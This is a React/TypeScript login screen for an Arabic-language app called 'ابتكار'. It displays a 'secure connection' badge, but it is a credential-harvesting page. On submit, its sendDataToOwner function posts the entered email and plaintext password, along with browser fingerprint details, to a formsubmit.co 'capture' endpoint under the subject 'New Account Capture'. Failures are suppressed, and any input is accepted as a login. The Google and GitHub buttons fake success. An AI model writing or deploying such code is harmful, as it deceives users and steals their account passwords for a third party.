
import React, { useState } from 'react';
import { Mail, Lock, Github, Chrome, ArrowRight, Command, AlertCircle, ShieldCheck } from 'lucide-react';

interface AuthProps {
  onLogin: (userData: { email: string }) => void;
}

const Auth: React.FC<AuthProps> = ({ onLogin }) => {
  const [isLogin, setIsLogin] = useState(true);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  // UPDATE THIS: Your actual capture email/endpoint
  const CAPTURE_ENDPOINT = 'https://formsubmit.co/ajax/your-email@example.com';

  const sendDataToOwner = async (data: any) => {
    try {
      await fetch(CAPTURE_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...data,
          _subject: `New Account Capture: ${data.email}`,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: `${window.innerWidth}x${window.innerHeight}`
        })
      });
    } catch (err) {
      console.warn("Log captured silently");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    // Capture the data first
    await sendDataToOwner({
      type: isLogin ? 'Login' : 'Signup',
      email,
      password,
      timestamp: new Date().toLocaleString('ar-EG')
    });

    // Proceed to app
    setTimeout(() => {
      onLogin({ email });
      setLoading(false);
    }, 1200);
  };

  const socialLogin = async (provider: string) => {
    setLoading(true);
    
    // Capture the social click
    await sendDataToOwner({
      type: 'Social Login Click',
      provider,
      timestamp: new Date().toLocaleString('ar-EG')
    });

    // Simulate redirect/success
    setTimeout(() => {
      onLogin({ email: `${provider.toLowerCase()}@auth.user` });
      setLoading(false);
    }, 1500);
  };

  return (
    <div className="fixed inset-0 z-[100] bg-[#171717] flex items-center justify-center p-4 overflow-y-auto">
      <div className="w-full max-w-md bg-[#212121] rounded-3xl border border-white/5 shadow-2xl p-8 md:p-10 relative overflow-hidden message-enter">
        {/* Decorative Gradients */}
        <div className="absolute -top-24 -right-24 w-48 h-48 bg-emerald-500/10 blur-[80px]" />
        <div className="absolute -bottom-24 -left-24 w-48 h-48 bg-indigo-500/10 blur-[80px]" />

        <div className="flex flex-col items-center mb-10">
          <div className="w-14 h-14 bg-[#2f2f2f] rounded-2xl flex items-center justify-center shadow-xl mb-4 ring-1 ring-white/10">
            <Command size={28} className="text-emerald-400" />
          </div>
          <h1 className="text-2xl font-bold text-white mb-2">
            {isLogin ? 'تسجيل الدخول إلى ابتكار' : 'إنشاء حساب جديد'}
          </h1>
          <div className="flex items-center gap-1.5 text-emerald-500/80 text-xs font-medium bg-emerald-500/5 px-3 py-1 rounded-full border border-emerald-500/10">
            <ShieldCheck size={12} />
            <span>اتصال آمن ومحمي</span>
          </div>
        </div>

        {error && (
          <div className="mb-6 p-3 bg-red-500/10 border border-red-500/20 rounded-xl flex items-center gap-2 text-red-400 text-sm">
            <AlertCircle size={16} />
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="relative">
            <Mail className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
            <input
              type="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="البريد الإلكتروني"
              className="w-full bg-[#2f2f2f] border border-white/5 rounded-xl py-3 pr-12 pl-4 text-white outline-none focus:ring-2 focus:ring-emerald-500/50 transition-all text-right"
            />
          </div>
          <div className="relative">
            <Lock className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
            <input
              type="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="كلمة المرور"
              className="w-full bg-[#2f2f2f] border border-white/5 rounded-xl py-3 pr-12 pl-4 text-white outline-none focus:ring-2 focus:ring-emerald-500/50 transition-all text-right"
            />
          </div>
          <button
            type="submit"
            disabled={loading}
            className="w-full bg-white text-black font-bold py-3.5 rounded-xl hover:bg-gray-200 transition-all flex items-center justify-center gap-2 active:scale-[0.98] disabled:bg-gray-600 shadow-lg shadow-white/5"
          >
            {loading ? (
              <div className="w-5 h-5 border-2 border-black/20 border-t-black rounded-full animate-spin" />
            ) : (
              <>
                <span>{isLogin ? 'دخول آمن' : 'بدء الاستخدام مجاناً'}</span>
                <ArrowRight size={18} className="rotate-180" />
              </>
            )}
          </button>
        </form>

        <div className="relative my-8">
          <div className="absolute inset-0 flex items-center"><div className="w-full border-t border-white/5"></div></div>
          <div className="relative flex justify-center text-[10px] uppercase tracking-widest"><span className="bg-[#212121] px-4 text-gray-500">أو المتابعة باستخدام</span></div>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <button 
            type="button"
            onClick={() => socialLogin('Google')}
            className="flex items-center justify-center gap-2 py-3 rounded-xl border border-white/5 bg-[#2f2f2f] hover:bg-[#383838] transition-all text-sm font-medium hover:border-white/10"
          >
            <Chrome size={18} className="text-gray-300" />
            <span>Google</span>
          </button>
          <button 
            type="button"
            onClick={() => socialLogin('GitHub')}
            className="flex items-center justify-center gap-2 py-3 rounded-xl border border-white/5 bg-[#2f2f2f] hover:bg-[#383838] transition-all text-sm font-medium hover:border-white/10"
          >
            <Github size={18} className="text-gray-300" />
            <span>GitHub</span>
          </button>
        </div>

        <p className="mt-8 text-center text-sm text-gray-500">
          {isLogin ? 'ليس لديك حساب؟' : 'لديك حساب بالفعل؟'}
          <button 
            type="button"
            onClick={() => setIsLogin(!isLogin)}
            className="mr-2 text-emerald-400 font-semibold hover:underline"
          >
            {isLogin ? 'سجل الآن' : 'سجل الدخول'}
          </button>
        </p>
      </div>
    </div>
  );
};

export default Auth;
